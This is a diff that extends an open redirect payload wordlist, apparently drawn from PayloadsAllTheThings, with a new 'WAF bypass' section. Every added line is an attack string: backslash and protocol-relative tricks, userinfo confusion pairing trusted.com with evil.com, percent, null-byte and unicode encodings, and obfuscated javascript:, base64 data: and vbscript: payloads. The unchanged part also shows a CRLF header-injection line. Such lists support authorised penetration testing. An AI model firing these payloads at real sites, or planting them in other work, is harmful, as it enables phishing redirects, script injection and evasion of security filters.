@@ -1,6 +1,6 @@
 # Open Redirect payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 285 payloads
+# Total: 317 payloads
 https://evil.com
 http://evil.com
 //evil.com
@@ -288,3 +288,41 @@ hTtPs://notscan-evil.com/
 http://notscan-evil.com/%0d%0aLocation: http://notscan-evil.com/
 //notscan-evil.com:443/
 https://notscan-evil.com/?next=//notscan-evil.com
+
+# --- WAF bypass ---
+# protocol-relative / backslash
+https:/\evil.com
+https:\/\/evil.com
+https:\\evil.com
+\/\/evil.com
+\\/evil.com
+/\/evil.com
+.//evil.com
+..//evil.com
+./\/evil.com
+////evil.com/%2F..
+# @ / userinfo confusion
+https://trusted.com@evil.com
+http://evil.com:80@trusted.com
+https://evil.com#@trusted.com
+https://evil.com?@trusted.com
+http://trusted.com:80@evil.com
+https://@evil.com
+https://@evil.com/@trusted.com
+http://evil.com\@trusted.com
+https://evil.com%23.trusted.com
+https://evil.com%3f.trusted.com
+# percent / unicode encoding
+%2F%2Fevil.com
+%5C%5Cevil.com
+https:%2F%2Fevil.com
+https:%5Cevil.com
+http://evil.com%00.trusted.com
+http://evil.com./
+https:%EF%BC%8F%EF%BC%8Fevil.com
+# scheme obfuscation (redirect context)
+jAvAsCrIpT:alert(1)
+java%0ascript:alert(1)
+%6a%61%76%61%73%63%72%69%70%74:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
